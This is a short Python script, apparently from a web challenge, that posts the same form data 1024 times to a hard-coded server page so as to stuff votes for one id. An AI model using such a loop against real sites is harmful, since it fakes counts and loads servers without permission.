import requests

URL = "http://158.69.76.135/level0.php"

for i in range(0, 1024):
	params = {
	"id": "2596",
	"holdthedoor": "Submit+Query"
	}

	res = requests.post(URL, data=params)
print(res)